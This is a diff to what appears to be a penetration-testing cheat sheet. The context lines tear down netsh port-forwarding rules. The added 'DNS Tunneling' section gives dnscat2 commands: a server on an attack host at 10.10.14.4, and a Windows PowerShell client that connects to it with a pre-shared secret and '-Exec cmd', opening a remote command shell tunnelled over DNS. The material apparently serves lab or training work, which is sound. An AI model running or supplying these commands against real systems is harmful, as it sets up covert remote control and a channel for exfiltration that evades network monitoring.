@@ -135,3 +135,14 @@ netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 co
 netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
 netsh interface portproxy del v4tov4 listenport=4455 listenaddress=10.11.0.22
 ```
+### DNS Tunneling 
+Linux server
+```
+dnscat2-server --dns host=10.10.14.4(attack host),port=53,domain=baidu.com(domain name it will query to)
+It will generate a secret
+```
+Windows Client
+```
+Import-Module .\dnscat2.ps1
+Start-Dnscat2 -DNSserver 10.10.14.4 -Domain baidu.com -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
+```
